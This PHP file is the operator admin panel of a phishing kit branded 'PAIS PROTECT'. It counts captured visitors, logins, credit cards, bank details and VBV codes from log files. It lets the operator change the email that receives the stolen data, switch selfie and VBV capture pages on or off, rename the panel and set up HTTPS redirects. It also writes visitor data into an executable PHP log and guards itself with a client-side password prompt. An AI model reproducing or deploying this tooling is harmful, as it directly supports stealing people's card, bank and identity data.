<?php
error_reporting(0);
include('../settings.php');
include('enc.php');
include_once '../detect.php';
include_once '../detect_os.php';

date_default_timezone_set("Asia/Bangkok");
$uriSegments = explode("/", parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
$lastUriSegment = array_pop($uriSegments);

$dt = date("l, F j Y h:i:s A");
$dt1 = strtotime(date("Y-m-d H:i:s"));

$msg = "<?php ".'$start = '.'"'.$dt1.'"; '." ".'$end = '.'strtotime(date("Y-m-d H:i:s"))'."; ".' '." echo '<font color=blue>PANEL</font> > ".$ip.", ".$user_browser.", ".$user_os.", ".$nama_negara.", ".$kota.", ".date('Y-m-d').", <font color=red>'; ".' echo round(abs($end - $start) / 60,0). " minute ago </font><br/>"; ?>'."
";

$file=fopen("../visitor_log.php","a");
fwrite($file, $msg);
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="http://pokkho.com/adminplus/assets/images/favicon.ico">
        <title>Admin - Login</title>
  
  <link rel="stylesheet" href="http://pokkho.com/adminplus/assets/admin/css/bootstrap.min.css">

  <!-- Bootstrap 4.0-->
  <link rel="stylesheet" href="http://pokkho.com/adminplus/assets/admin/css/bootstrap-extend.css">
  
  <!-- Theme style -->
  <link rel="stylesheet" href="http://pokkho.com/adminplus/assets/admin/css/master_style.css">

  <link href="http://pokkho.com/adminplus/assets/admin/css/sweet-alert.css" rel="stylesheet" />

  <link rel="stylesheet" href="http://pokkho.com/adminplus/assets/admin/css/skins/_all-skins.css"> 
  	<link href="../assets/bootstrap.min.css" rel="stylesheet">
	<script src="../assets/bootstrap.min.js"></script>
	<script src="../assets/jquery-1.9.1.js"></script>
  <script src="http://pokkho.com/adminplus/assets/admin/js/admin.js"></script>
  <script src="http://pokkho.com/adminplus/assets/admin/js/sweet-alert.min.js"></script>
  	<script type="text/javascript">
		$(document).ready(function() {
			$('.form-log').load('../visitor_log.php');
		});
	</script>
	<script language="JavaScript" type="text/javascript">
		<!--hide
		var allowed = false;
		var lul;
		var yeah="<?= $pais_access ?>";
		if (allowed == false) {
			lul = prompt('Enter your password panel to view this page!', '');
			if (lul == yeah) {
				alert('Success!');
				allowed = true;
			} else {
				alert('Failed!');
				window.location = "https://fb.com/faizkcil";
			}
		} else if (allowed == true) {
			alert('You have already entered the password. Click OK to enter!');
		}
//-->
</script>
</head>
<body style="background: black; color: white; font-family: 'Roboto', sans-serif;">
		<!-- <tr>
			<td width="40%" align="center">
				<table>
					<tr>
						<td align="right">
							<form method="POST">
								<input type="submit" class="btn btn-info btn-sm" name="https_nonactive" value="Non Active HTTPS">
							</form>
						</td>
						<td align="left">
							<form method="POST">
								<input type="submit" class="btn btn-info btn-sm" name="https_active" value="Active HTTPS">
							</form>
						</td>
					</tr>
				</table>
			</td>
		</tr> -->
	</table>
	<br/>
	<table width="90%" align="center">
		<tr>
			<td width="45" align="center"><h5><strong>Setting Your SC</strong></h5></td>
			<td width="45" align="center"><h5><strong>Log Visitor's</strong></h5></td>
		</tr>
	</table>
	<table align="center" width="90%" border="1">
		<tr>
			<td width="50%">
				<table align="left">
					<tr>
						<td align="center">Now</td>
						<td align="center">New</td>
					</tr>
					<tr>
						<form method="POST">
							<td align="left">
								<input type="text" class="form-control-sm" size="30" name="txt_oldemail" value="<?php echo $pais_email; ?>" required=required readonly="">
							</td>
							<td align="left">
								<input type="text" class="form-control-sm" size="30" name="txt_newemail" value"" placeholder="yourmail@domain.com" required=required>
							</td>
							<td align="left" colspan="2">
								<input type="submit" class="btn btn-info btn-sm" name="change_email" value="Change Email">
							</td>
						</form>
					</tr>
					<tr>
						<form method="POST">
							<td align="left">
								<input type="text" class="form-control-sm" size="15" name="txt_oldpassword" value="<?php echo $pais_minpass; ?>" required="required" readonly="">
							</td>
							<td align="left">
								<input type="text" class="form-control-sm" size="15" name="txt_newpassword" placeholder="New" value="" required=required>
							</td>
							<td colspan="2" align="left">
								<input type="submit" class="btn btn-info btn-sm" name="change_password" value="Change Password">
							</td>
						</form>
					</tr>
					<tr>
						<form method="POST">
							<td align="left">
								<input type="text" class="form-control-sm" size="15" name="txt_oldpanel" value="<?php echo $lastUriSegment; ?>" required="required" readonly="">
								<input type="hidden" class="form-control-sm" size="15" name="txt_oldpanelphp" value="<?php echo $lastUriSegment. ".php"; ?>" required="required" readonly="">
							</td>
							<td align="left">
								<input type="text" class="form-control-sm" size="15" name="txt_newpanel" id="txt_newpanel" maxlength="8" placeholder="New Key" value="" required=required>
							</td>
							<td align="left" colspan="2">
								<input type="submit" class="btn btn-info btn-sm" name="change_panel" id="id_change_panel" value="Change Panel">
							</td>
						</form>
					</tr>
					<tr>
						<form method="POST">
							<td align="left">
								<input type="text" class="form-control-sm" size="15" name="txt_oldlang" value="<?php echo $pais_multilang; ?>" required="required" readonly="">
							</td>
							<td align="left">
								<select class="form-control-sm" name="txt_newlang">
									<option value="lang_active" <?= $pais_multilang != 'lang_active' ? "selected=''" : "" ?>>Active</option>
									<option value="lang_nonactive" <?= $pais_multilang != 'lang_nonactive' ? "selected=''" : "" ?>>Non Active</option>
								</select>
							</td>
							<td align="left" colspan="2">
								<input type="submit" class="btn btn-info btn-sm" name="change_lang" id="id_change_lang" value="Change Language">
							</td>
						</form>
					</tr>
					<tr>
						<form method="POST">
							<td align="left">
								<input type="text" class="form-control-sm" size="15" name="txt_oldselfie" value="<?php echo $pais_selfie; ?>" required="required" readonly="">
							</td>
							<td align="left">
								<select class="form-control-sm" name="txt_newselfie">
									<option value="selfie_active" <?= $pais_selfie != 'selfie_active' ? "selected=''" : "" ?>>Active</option>
									<option value="selfie_nonactive" <?= $pais_selfie != 'selfie_nonactive' ? "selected=''" : "" ?>>Non Active</option>
								</select>
							</td>
							
							<td align="left" colspan="2">
								<input type="submit" class="btn btn-info btn-sm" name="change_selfie" id="id_change_selfie" value="Change Selfie">
							</td>
						</form>
					</tr>
					<tr>
						<form method="POST">
							<td align="left">
								<input type="text" class="form-control-sm" size="15" name="txt_oldvbv" value="<?php echo $pais_vbv; ?>" required="required" readonly="">
							</td>
							<td align="left">
								<select class="form-control-sm" name="txt_newvbv">
									<option value="vbv_active" <?= $pais_vbv != 'vbv_active' ? "selected=''" : "" ?>>Active</option>
									<option value="vbv_nonactive" <?= $pais_vbv != 'vbv_nonactive' ? "selected=''" : "" ?>>Non Active</option>
								</select>
							</td>
							<td align="left" colspan="2">
								<input type="submit" class="btn btn-info btn-sm" name="change_vbv" id="id_change_vbv" value="Change VBV">
							</td>
						</form>
					</tr>
					<tr>
						<form method="POST">
							<td align="left">
								<input type="text" class="form-control-sm" size="30" name="txt_oldaccess" value="<?php echo $pais_access; ?>" required=required readonly="">
							</td>
							<td align="left">
								<input type="text" class="form-control-sm" size="30" name="txt_newaccess" value"" placeholder="123456" required=required>
							</td>
							<td align="left" colspan="2">
								<input type="submit" class="btn btn-info btn-sm" name="change_access" value="Change Access">
							</td>
						</form>
					</tr>
					<tr>
						<td width="100%" colspan="3">
							<table align="center">
								<tr>
									<td>
          <button type="button" class="btn btn-info btn-sm">
											Visitor's <span class="badge badge-light"><?php echo empty(@file_get_contents("../logsz/visitor.txt")) ? "0" : @file_get_contents("../logsz/visitor.txt"); ?></span>
										</button>
										<button type="button" class="btn btn-info btn-sm">
											Login's <span class="badge badge-light"><?php echo empty(@file_get_contents("../logsz/login.txt")) ? "0" : @file_get_contents("../logsz/login.txt"); ?></span>
										</button>
										<button type="button" class="btn btn-info btn-sm">
											Cc's <span class="badge badge-light"><?php echo empty(@file_get_contents("../logsz/cc.txt")) ? "0" : @file_get_contents("../logsz/cc.txt"); ?></span>
										</button>
										<button type="button" class="btn btn-info btn-sm">
											Bank's <span class="badge badge-light"><?php echo empty(@file_get_contents("../logsz/bank.txt")) ? "0" : @file_get_contents("../logsz/bank.txt"); ?></span>
										</button>
										<button type="button" class="btn btn-info btn-sm">
											Vbv's <span class="badge badge-light"><?php echo empty(@file_get_contents("../logsz/vbv.txt")) ? "0" : @file_get_contents("../logsz/vbv.txt"); ?></span>
										</button>
									</td>
								</tr>
							</table>
						</td>
					</tr>
				</table>
			</form>
		</td>
		<td width="50%">
			<div class="form-log" style="font-size: 10px; overflow:scroll; height:310px;"></div>
			
   <script src="http://pokkho.com/adminplus/assets/admin/js/jquery.min.js"></script> 
  <!-- popper -->
  <script src="http://pokkho.com/adminplus/assets/admin/js/popper.min.js"></script>
  <!-- Bootstrap 4.0-->
		</td>
	</tr>
</table>
<br/>
<br/>
<br/>
<?php
@unlink("set.php");

$oldemail   = trim(@$_POST['txt_oldemail']);
$newemail   = trim(@$_POST['txt_newemail']);
$oldpassword   = trim(@$_POST['txt_oldpassword']);
$newpassword   = trim(@$_POST['txt_newpassword']);
$oldpanel   = trim(@$_POST['txt_oldpanel']);
$newpanel   = trim(@$_POST['txt_newpanel']);
$oldpanelphp   = trim(@$_POST['txt_oldpanelphp']);
$oldlang   = trim(@$_POST['txt_oldlang']);
$newlang   = trim(@$_POST['txt_newlang']);
$oldselfie   = trim(@$_POST['txt_oldselfie']);
$newselfie   = trim(@$_POST['txt_newselfie']);
$oldvbv   = trim(@$_POST['txt_oldvbv']);
$newvbv   = trim(@$_POST['txt_newvbv']);
$oldaccess   = trim(@$_POST['txt_oldaccess']);
$newaccess   = trim(@$_POST['txt_newaccess']);
$file   = "../settings.php";
$isi    = @file_get_contents($file);

if(isset($_POST['change_email'])) {
	if(@preg_match("#\b$oldemail\b#is", $isi)) {
		$isi = str_replace($oldemail,$newemail,$isi);
		$open = @fopen($file,'w');
		@fwrite($open,$isi);
		fclose($open);

		echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
	}
	else{
		echo "<script>alert('Refresh Page CTRL+F5')</script>";
	}
}

if(isset($_POST['change_access'])) {
	if(@preg_match("#\b$oldaccess\b#is", $isi)) {
		$isi = str_replace($oldaccess,$newaccess,$isi);
		$open = @fopen($file,'w');
		@fwrite($open,$isi);
		fclose($open);

		echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
	}
	else{
		echo "<script>alert('Refresh Page CTRL+F5')</script>";
	}
}

if(isset($_POST['change_password'])) {
	if(@preg_match("#\b$oldpassword\b#is", $isi)) {
		$isi = str_replace($oldpassword,$newpassword,$isi);
		$open = @fopen($file,'w');
		@fwrite($open,$isi);
		fclose($open);

		echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
	}
	else{
		echo "<script>alert('Refresh Page CTRL+F5')</script>";
	}
}

if(isset($_POST['change_panel'])) {
	if(@preg_match("#\b$oldpassword\b#is", $isi)) {
		$oldpanelname = $oldpanelphp;
		$ext = strtolower(substr($oldpanelname, strripos($oldpanelname, '.')+1));

		$newpanelname = $newpanel.'.'.$ext;

		$fileAwal = $oldpanelname;
		$fileBaru = $newpanelname;
		rename($fileAwal, $fileBaru);

		echo "<script>alert('DONE PAIS PROTECT'); </script>";
		echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/PAIS/$newpanel'/>";
	}else{
		echo "<script>alert('Refresh Page CTRL+F5')</script>";
	}
}

if(isset($_POST['change_lang'])) {
	if(@preg_match("#\b$oldlang\b#is", $isi)) {
		$isi = str_replace($oldlang,$newlang,$isi);
		$open = @fopen($file,'w');
		@fwrite($open,$isi);
		fclose($open);

		echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
	}
	else{
		echo "<script>alert('Refresh Page CTRL+F5')</script>";
	}
}

if(isset($_POST['change_selfie'])) {
	if(@preg_match("#\b$oldselfie\b#is", $isi)) {
		$isi = str_replace($oldselfie,$newselfie,$isi);
		$open = @fopen($file,'w');
		@fwrite($open,$isi);
		fclose($open);

		echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
	}
	else{
		echo "<script>alert('Refresh Page CTRL+F5')</script>";
	}
}

if(isset($_POST['change_vbv'])) {
	if(@preg_match("#\b$oldvbv\b#is", $isi)) {
		$isi = str_replace($oldvbv,$newvbv,$isi);
		$open = @fopen($file,'w');
		@fwrite($open,$isi);
		fclose($open);

		echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
	}
	else{
		echo "<script>alert('Refresh Page CTRL+F5')</script>";
	}
}


if(isset($_POST['https_nonactive'])) {
	unlink('../signin/.htaccess');
}

if(isset($_POST['https_active'])) {
	$f = fopen("../signin/.htaccess", "a+");
	fwrite($f, "<IfModule mod_rewrite.c>
	RewriteEngine on
	RewriteCond %{HTTPS} !=on [NC]
	RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
</IfModule> ");
	fclose($f);
}
?>
</body>
</html>
